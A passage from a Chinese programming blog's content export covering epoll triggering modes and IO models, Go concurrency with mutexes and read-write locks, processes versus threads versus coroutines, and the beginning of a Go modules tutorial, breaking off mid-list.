<li>边缘触发（Edge Triggered, ET）：当文件描述符关联的读内核缓冲区由空转化为非空的时候，则发出可读信号进行通知，当文件描述符关联的内核写缓冲区由满转化为不满的时候，则发出可写信号进行通知。事件通知仅在被监听文件描述符的缓冲区状态在满/不满之间变化的时候才会发生一次。边缘触发需要一次性的把缓冲区的数据读完，也就是一直读直到读到 EGAIN （缓冲区为空）为止，否则在这个 fd 的内核缓冲区下一次处于满状态前无法再次获得它。因为这一点，边缘触发需要设置文件句柄为非阻塞。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//水平触发，就算 buf 容量不足，下次监听系统也会 fd</span></span><br><span class="line">ret = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">//边缘触发，读就要一次性读完，否则下次监听系统未必会再返回 fd</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    ret = read(fd, buf, <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> (ret == EAGAIN) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结：</p>
<ol>
<li>对于监听的sockfd，最好使用水平触发模式，边缘触发模式会导致高并发情况下，有的客户端会连接不上</li>
<li>对于读写的connfd，水平触发模式下，阻塞和非阻塞效果都一样</li>
<li>对于读写的connfd，边缘触发模式下，必须使用非阻塞IO，并要一次性全部读写完数据</li>
</ol>
<h2 id="信号-IO"><a href="#信号-IO" class="headerlink" title="信号 IO"></a>信号 IO</h2><p>让内核在描述符就绪时发送 SIGIO 信号通知进程。这种模型为信号驱动式 IO（signal-driven IO），和事件驱动类似，也是一种回调方式。与非阻塞方式不一样的地方是，发起了信号驱动的系统调用，进程没有挂起，可以做的事情，可是实际中，代码逻辑通常还是主循环，主循环里可能还是会阻塞。因此使用这样的 IO 的软件很少。</p>
<p>当信号返回可以读写的时候，因为还需要 cpu 将内核数据 copy 到 app buf，拷贝数据阶段毫无疑问还是阻塞的。</p>
<p><img src="https://i.loli.net/2020/04/17/73r6sTCnzG45HFN.png" alt="信号IO"></p>
<h2 id="异步-IO"><a href="#异步-IO" class="headerlink" title="异步 IO"></a>异步 IO</h2><p>异步是指应用与内核存在 CPU 竞争（在同步 IO 中应用都是等 kernel buf 中的数据拷贝到 app buf 后再执行的）。</p>
<p><img src="https://i.loli.net/2020/04/17/lYpgvAdNwyQuCr9.png" alt="异步IO"></p>
<p>无论是第一阶段数据准备还是第二阶段数据拷贝，发起系统调用的进程都不会被阻塞。第二阶段过程中，进程没有阻塞，那么可以抢占 CPU，而 kernel buf copy 数据到 app buf 的时候，也需要 CPU，这就造成了应用和内核进行 CPU 竞争，步调不一致了。某些情况下，其性能反而不如其他 IO 模式。使用的人也很少。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>IO 即数据在 app buf、kernel buf、硬件三者之间的流动。</p>
<p>数据等待阶段根据发起 IO 请求的进程是否阻塞分为：</p>
<ul>
<li>阻塞：进程挂起</li>
<li>非阻塞：进程不挂起，立即返回，返回EWOULDBLOCK</li>
</ul>
<p>数据拷贝阶段根据发起 IO 请求的进程是否阻塞分为：</p>
<ul>
<li>同步：内核拷贝数据占用 CPU</li>
<li>异步：进程可能和内核竞争 CPU</li>
</ul>
<p>同步非阻塞就是十分常见的多路复用结合非阻塞IO实现的方案，也称之为事件驱动。同步有利于逻辑的书写，非阻塞有利于调用率实现并发。因此现实中更多的IO模型是多路复用IO，并且在发展过程中，select，poll和epoll是逐步进化链。epoll实现了内核级数据结构优化，在实际性能上又了很大的提升。</p>
<p>参考资料：</p>
<p><a href="https://www.jianshu.com/p/e62f0ef9629d" target="_blank" rel="noopener">简明网络IO</a></p>
<p><a href="https://www.cnblogs.com/Anker/p/3265058.html" target="_blank" rel="noopener">select、poll、epoll之间的区别总结</a></p>
<p><a href="https://blog.csdn.net/cuiyifang/article/details/7957937" target="_blank" rel="noopener">epoll简介及例子</a></p>
<p><a href="https://blog.csdn.net/u011063112/article/details/81771440" target="_blank" rel="noopener">epoll详解</a></p>
<p><a href="https://www.cnblogs.com/yorkyang/p/7688865.html" target="_blank" rel="noopener">epoll的水平触发与边缘触发</a></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>并发编程-以 Go 为例</title>
    <url>/2020/03/24/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E4%BB%A5Go%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>所谓<code>并发</code>(concurrency) 是指几段程序在同一时间段内交错执行，当我们无法肯定一个事件一定会会先于另一个事件发生，那么就可以说这几个时间是“并发”的。如果一个函数在并发调用时仍能正确执行，这个函数就是<code>并发安全</code>的；如果一个类型的所有可访问方法和操作都是并发安全的，则它就是一个并发安全的类型。</p>
<p>本文主要介绍了几种并发编程中常见的问题及对策，所有的例子都会用 Go 语言来描述，还会涉及到一些 Go 对并发编程的支持。</p>
<h1 id="竞态"><a href="#竞态" class="headerlink" title="竞态"></a>竞态</h1><p>竞态是指多个 goroutine 并发执行时，程序无法给出正确结果。比如多个 goroutine 同时修改了一个包级别变量的值，那么很可能导致某一个 goroutine 的修改对另一个 goroutine 不可见：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">100</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">200</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段代码执行以后，balance 有几种可能取值：300，200，100。程序中的这种状态称为<code>数据竞态</code>，是竞态的一种。数据竞态发生在多个 goroutine 并发读写同一个变量并且至少一个为写操作的时候。</p>
<p>有三种方法可以避免数据竞态：</p>
<ol>
<li>不对变量做写操作。如果没有 goroutine 对变量的值进行修改，那么数据竞态自然无从说起。</li>
<li>避免多个 goroutine 对一个变量进行访问。简言之就是这个变量的所有操作都在一个<code>监控 goroutine</code> 内执行，由于一个 goroutine 内的结果是<code>串行一致</code>的，也就不会产生修改不可见的问题。</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> deposit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// 其它 goroutine 通过这个通道间接写 amount</span></span><br><span class="line"><span class="keyword">var</span> balance = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// 其它 goroutine 通过这个通道间接读 amount</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> monitor()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">monitor</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> amount = <span class="number">0</span> <span class="comment">// amount 被限制在 monitor goroutine 中</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> count := &lt;- deposit:</span><br><span class="line">                amount += count</span><br><span class="line">            <span class="keyword">case</span> balance &lt;- amount:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    deposit &lt;- count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;- balance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>即使一个变量无法被完全限制在一个 goroutine 内，也可以把对这个变量的操作划分为好几个阶段，只要每个阶段被限制在一个 goroutine 内访问就可以了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">    content <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(origin <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    book = <span class="built_in">new</span>(Book)</span><br><span class="line">    book.content = <span class="string">"hello world"</span></span><br><span class="line">    origin &lt;- book</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">revise</span><span class="params">(origin &lt;- <span class="keyword">chan</span> *Book, corrected <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> book := <span class="keyword">range</span> origin &#123;</span><br><span class="line">        book.content += <span class="string">"!"</span></span><br><span class="line">        corrected &lt;- book</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>在一个时刻只允许一个 goroutine 操作这个变量。这种方法称为<code>互斥机制</code>。我们可以使用带一个缓冲的通道来实现：</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> sema = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    sema &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125; <span class="comment">// 获取信号量</span></span><br><span class="line">    amount += count</span><br><span class="line">    &lt;- sema <span class="comment">// 释放信号量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然，这是一个非常简陋的实现。Go 已经为我们造好了完备的轮子：sync.Mutex。有了互斥锁，代码就可以写成这个样子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"sync"</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    mu sync.Mutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// 通常被保护变量放在锁后面声明</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    mu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mu.Unlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要注意的是，sync.Mutex 是“不可再入”的。</p>
<p>当读操作远多于写操作时，互斥锁会明显拖累系统的速度（最严重时只有单个 goroutine 会被执行）。读写锁 sync.RWMutex 特别适合这种场景。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"sync"</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    rwmu sync.RWMutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// 通常被保护变量放在锁后面声明</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    rwmu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    rwmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    rwmu.RLock()</span><br><span class="line">    <span class="keyword">defer</span> rwmu.UnRlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>读写锁支持四种操作：获得写锁 Lock()，释放写锁 UnLock()，获得读锁 RLock()，释放读锁 UnRLock()。</p>
<p>写锁又称为<code>排它锁（X锁）</code>：若事务 T 对数据 A 加上 X 锁，T 可以读 A 也可以修改 A，其他事务不能再对 A 加任何锁，直到 T 释放 A 上的锁。这保证了其他事务在 T 释放 A 上的锁之前不能再读取和修改 A。</p>
<p>读锁又称为<code>共享锁（S锁）</code>：若事务 T 对 数据 A 加上 S 锁，则 T 可以读 A 但不能修改 A，其他事务只能再对 A 加 S 锁，而不能加 X 锁，直到 T 释放 A 上的 S 锁。这保证了其他事务可以读 A，但在 T 释放 A 上的 S 锁之前不能对A做任何修改。</p>
<p>写锁最多有一个，而读锁可以有多个。一个 goroutine 获得写锁后，直到这个写锁被释放前，其它 goroutine 不可以获得读锁或者写锁；一个 goroutine 获得读锁后，其它 goroutine 可以获得读锁，但是不能获得写锁。</p>
<p>如果写锁和读锁是平级的，假设当前已经上了读锁，此时一个 goroutine 的 Lock() 操作会被阻塞。而如果不断有 goroutine 获得读锁那么 Lock() 操作就会一直阻塞下去。因此，<code>写锁的优先级高于读锁</code>，即当获得写锁的请求产生以后，直到 Lock() 执行成功前所有 RLock() 操作都会阻塞。</p>
<p>对读操作上读锁，避免读到脏数据的同时又提高了资源访问速度！</p>
<p>要注意的是，go 的读写锁是通过互斥锁加上引用计数器实现的，所以除非读操作确实远远比写操作多，否则读写锁未必就比互斥锁效率高。</p>
<h1 id="内存同步"><a href="#内存同步" class="headerlink" title="内存同步"></a>内存同步</h1><p>即使是一个只包含单个操作的只读操作，上锁也是必要的。一是为了防止这个操作被插入到对该变量的写入操作中，二是将处理器缓存中的内容刷入内存。</p>
<p>现代计算机一般会有多个处理器，每个处理器都有自己的缓存。对变量的写操作通常不会直接写入内存，而是先记录在处理器缓存中，在操作系统认为必要的时候再刷回内存。而通道通信和互斥锁这样的<code>同步原语</code>都会强制刷回内存，如此一来在这之前的 goroutine 的执行结果就对当前 goroutine 可见了。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        fmt.Print(<span class="string">"y="</span>, y, <span class="string">" "</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        fmt.Print(<span class="string">"x="</span>, x, <span class="string">" "</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于 A、B 四行语句的交替执行，以上代码的如下输出是可接受的：</p>
<ol>
<li>y=0 x=1</li>
<li>y=2 x=1</li>
<li>x=0 y=2</li>
<li>x=1 y=2</li>
</ol>
<p>但是由于处理器缓存的存在，写操作（A1 &amp;&amp; B1）可能不会立即对其它 goroutine 可见，那么其它 goroutine 就会使用过期值。此外，由于赋值语句和输出语句对应不同变量，编译器可能认为这两个语句的执行顺序是不重要的，于是私自调换了语句的执行顺序。我们可能看到这样的非预期输出：</p>
<ol>
<li>y=0 x=0</li>
<li>y=2 x=0</li>
<li>x=0 y=0</li>
<li>x=1 y=0</li>
</ol>
<p>要解决这样的问题，访问共享变量前利用上文提到的同步原语进行同步就可以了。</p>
]]></content>
      <categories>
        <category>语言</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>也说进程、线程与协程</title>
    <url>/2020/03/02/%E4%B9%9F%E8%B0%88%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="从-CPU-谈起"><a href="#从-CPU-谈起" class="headerlink" title="从 CPU 谈起"></a>从 CPU 谈起</h1><p>CPU 被誉为“计算机的大脑”，这个比喻可以说是很恰当了。计算机无论是进行 IO 还是计算都要在 CPU 的控制下完成。如此一来，一个强大的“大脑”对于整个系统而言就是非常重要的了，这也是为什么我们总能看到厂家不断地宣传自己 CPU 的主频有多高，核心有多大。</p>
<h2 id="多核-CPU"><a href="#多核-CPU" class="headerlink" title="多核 CPU"></a>多核 CPU</h2><p>要提高 CPU 的性能，最直接的方法当然是不断增强单个处理器的性能，让处理器频率更高。就像要举起一块石头，让自己变得足够强壮就可以了。</p>
<p>但是这种方法很快就受制于物理定律：当前技术条件下无限提高频率是不可能的，而且过高的频率也会导致发热量过大。因此，工程师们只好退而求其次，转而增加一个 CPU 内的处理器数量。还是要举起石头，一个人无论如何也举不起来，那多喊几个小弟帮忙总可以吧？</p>
<p>有了多核 CPU，程序就可以被划分为相对独立的几个部分，每一部分运行在不同的处理器上。当然，这样做也会带来额外的开销。如果操作系统和程序不能很好地协调多处理器，那么执行速度未必就有明显提高（乃至降低也说不定~）。</p>
<h1 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h1><p>下面给出进程的定义：</p>
<blockquote>
<p>进程是具有一定独立功能的程序在一个数据集合上的一次动态执行过程</p>
</blockquote>
<p>进程是操作系统<strong>分配资源</strong>的最小单位，拥有代码文本、被分配的系统资源、独立的虚拟内存地址、堆栈空间：</p>
<p><img src="https://i.loli.net/2020/03/02/qz7MdhlxtQmK8pI.png" alt="进程内存空间"></p>
<p>操作系统为每个进程维护了一个程序控制块（PCB, Process Contral Block），用来保存该进程的状态信息（进程标识、寄存器、系统资源、调度信息等）。PCB 是进程存在的唯一标识。</p>
<p>进程在整个生命周期期间处于以下五个状态之一：</p>
<p><img src="https://i.loli.net/2020/03/02/dY1JoNBIRLCFE4G.png" alt="进程状态"></p>
<ul>
<li>NULL -&gt; 创建：一个新进程被产生出来执行一个程序</li>
<li>创建 -&gt; 就绪：当进程被创建完成并初始化后，一切就绪准备运行时，变为就绪状态</li>
<li>就绪 -&gt; 运行：处于就绪状态的进程被进程调度程序选中后，就分配到处理机上来运行</li>
<li>运行 -&gt; 结束：当进程表示它已经完成或者因出错，当前运行进程会由操作系统作结束处理</li>
<li>运行 -&gt; 就绪：处于运行状态的进程在其运行过程中，由于分配给它的处理机时间片用完而让出处理机</li>
<li>运行 -&gt; 等待：当进程请求某资源且必须等待时</li>
<li>等待 -&gt; 就绪：当进程要等待某事件到来时，它从阻塞状态变到就绪状态</li>
</ul>
<h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p>线程是进程的一部分，描述一段指令流的执行状态，是系统<strong>调度</strong>的基本单位。每个线程拥有自己的线程控制块（TCB, Thread Contral Block），保存了线程标识、从属进程、寄存器状态等信息。</p>
<p><img src="https://i.loli.net/2020/03/02/P6MXJ5WHtQNp4x1.png" alt="线程内存空间"></p>
<p>如前面所言，程序被划分为几部分跑在不同处理器上，这些被划分出来的“部分”就可以看做一个个的线程。</p>
<h1 id="进程与线程的异同"><a href="#进程与线程的异同" class="headerlink" title="进程与线程的异同"></a>进程与线程的异同</h1><p>进程和线程的切换是 OS 通过调度算法，保存当前的上下文，然后从上次暂停的地方再次开始计算。每次 CPU 计算的指令数量和代码跑过的 CPU 时间是相关的，跑满 OS 分配的时间片后就会被强制挂起，开发者无法精确的控制它们。</p>
<ul>
<li>地址空间：同一进程的线程共享本进程的地址空间，而进程之间则是独立的地址空间</li>
<li>资源分配：同一进程内的线程共享本进程的资源如内存、I/O、cpu等，但是进程之间的资源是独立的</li>
<li>程序入口：每个独立的进程有一个程序运行的入口、顺序执行序列和程序的出口。而线程不能够独立执行，必须依存在进程中，由进程对多个线程执行控制。</li>
<li>健壮性：一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都死掉。所以多进程要比多线程健壮</li>
</ul>
<h1 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h1><p><strong>协程是编译器级的，进程是和线程是操作系统级的</strong></p>
<p>协程（Coroutine）是比线程更轻量级的存在，可以说是一种<strong>用户态线程</strong>。它更像是一个函数，只是这个函数可以像线程那样中途让出执行权，满足某种条件后又从等待的地方继续运行。</p>
<p>它比线程拥有更少的资源（必要的寄存器信息，堆栈指针等），<strong>切换策略仅由用户态控制</strong>，对于操作系统是透明的，所以协程间的切换非常快。但这也导致协程无法充分利用多核 CPU，因为协程再多，在操作系统眼里也只有一个线程在运行罢了。</p>
<p><img src="https://i.loli.net/2020/03/02/X3jbaStuZRByIdw.png" alt="协程"></p>
<p>Go 的调度器使用 m:n 调度，其中 m 是 goroutine 数，n 是活跃线程数（由 GOMAXPROCS 决定，默认等于处理器核心数）。当一个 goroutine 陷入休眠或阻塞在一次管道通信上，调度器会把它的状态设为 <code>_Gwaiting</code> 并解除它与线程的绑定（相当于让出线程，随后就可以执行一次 goroutine 调度），等待状态的 goroutine 不占用线程；而如果 goroutine 阻塞在一次 IO 或其它系统调用上调度器会更新 goroutine 状态为 <code>_Gsyscall</code> 并解除线程和处理器的绑定（相当于让出处理器，这样处理器就可以绑定到其它线程上。这个过程触发一次线程切换的系统调用）。</p>
<p>以 go 为例，在一个线程里面开启多个协程：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"sync"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> wg = sync.WaitGroup&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">        wg.Add(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(n <span class="keyword">int</span>)</span></span> &#123;    <span class="comment">// 开启一个新的协程</span></span><br><span class="line">            <span class="keyword">defer</span> wg.Done()</span><br><span class="line">            fmt.Printf(<span class="string">"%v: Hello World!\n"</span>, n)</span><br><span class="line">        &#125;(i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="协程的优点"><a href="#协程的优点" class="headerlink" title="协程的优点"></a>协程的优点</h2><ol>
<li>创建成本低。在 go 里每个协程大约只占用 1k 的内存。</li>
<li>调度成本低。协程属于用户态，不需要经过操作系统管理</li>
<li>减少上锁频率。因为协程都是跑在一个线程里的，所以不用担心指令执行到一半被夺去运行权限的问题。但是如果协程间存在竞争，并不能保证临界区，所以并不是完全不需要锁。</li>
</ol>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>开始你的Go Module之路</title>
    <url>/2020/02/21/%E5%BC%80%E5%A7%8B%E4%BD%A0%E7%9A%84Go-Module%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>在 go 的历史上出现过一大批包管理工具，如 dep，vendor 等。自 go1.12 以来官方引入了 go module 来解决这个乱象。</p>
<h1 id="从-GOPATH-说起"><a href="#从-GOPATH-说起" class="headerlink" title="从 GOPATH 说起"></a>从 GOPATH 说起</h1><p>GOPATH 是最早的 go 包管理方案，安装 golang 之后需要配置两个环境变量 <code>GOROOT</code> 与 <code>GOPATH</code>, 前者是 go 安装目录，后者是开发者自定义的用于存放代码的地方。GOPATH 下存在三个目录：</p>
<ul>
<li>bin: 存放编译后的可执行文件</li>
<li>pkg: 存放 go 的链接文件(suffix = .a)</li>
<li>src: 存放源代码</li>
</ul>
<p>平时我们的项目就放在 src 下，每个项目一个文件夹。每当我们用 import 语句导入包，go 会从 <code>$GOROOT/src</code> 和 <code>$GOPATH/src</code> 查找匹配的目录。举个栗子，假设我的 GOPATH 是 E:\go，在 src 下创建一个项目 service，里面有个 main.go 文件和 test 包：</p>
<p><img src="https://i.loli.net/2020/02/21/B9VCsnjychDQTJ4.png" alt="service"></p>
<p>main.go 文件内容如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/ramya-rao-a/go-outline"</span></span><br><span class="line">    <span class="string">"./test"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>fmt 是 go 自带的包，位于 $GOROOT/src/fmt；github.com/ramya-rao-a/go-outline 是第三方包，位于 $GOPATH/src/github.com/ramya-rao-a/go-outline；test 是自定义包，<code>.</code> 表示 mian.go 所在文件夹，位于 $GOPATH/src/service/test</p>
<h1 id="升级，Go-module！"><a href="#升级，Go-module！" class="headerlink" title="升级，Go module！"></a>升级，Go module！</h1><p>讲了一大堆，是时候进入正题了。前面讲利用 GOPATH 进行包管理这个方法是在是太麻烦了，每个项目都要配一个专属的 GOPATH，不然各个项目的包就会混在一起。</p>
<p>go1.12 后，设置环境变量 <code>GO111MODULE=on</code>，每个软件包都可以声明为一个 module。每个 module 的依赖包都会放在 $GOPATH/pkg/mod 下。如果没有设置 GOPATH 也没关系，go 会在用户的 $home 目录下创建一个 go 文件夹作为默认的 GOPATH</p>
<h2 id="声明-module"><a href="#声明-module" class="headerlink" title="声明 module"></a>声明 module</h2><p>modulename 是任意的。如果想把这个包发布出去，最好还是按 github.com/user/xxxx 的形式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init &lt;modulename&gt;</span><br></pre></td></tr></table></figure>
<p>举个栗子，还是那个 service 项目：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init github.com/yue-qiu/service</span><br></pre></td></tr></table></figure>
<p>现在，在这个项目里，github.com/yue-qiu/service 就是这个项目的根目录。main.go 改写为：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"github.com/ramya-rao-a/go-outline"</span></span><br><span class="line">    <span class="string">"github.com/yue-qiu/service/test"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>go mod 命令提供了一系列与 module 相关的用法：</p>
<p><img src="https://i.loli.net/2020/02/22/qk9bN2IMT48OSza.png" alt="module"></p>
<ul>
<li>go mod download: 根据 go.mod 中的内容拉取依赖包到本地</li>
<li>go mod tidy: 根据项目的导入信息往 go.mod 中添加、删除依赖包记录。建议少用，因为它会自动把所有依赖包升级到最新版本</li>
<li>go mod graph: 打印项目的依赖关系图</li>
<li>go mod vendor: 将 go.mod 中记录的依赖包缓存到一个 vendor 目录，这样在没网的情况下也能编译项目了</li>
<li>go mod edit [flag]: [flag] 又分好几种：<ul>
<li>fmt: 格式化 go.mod</li>
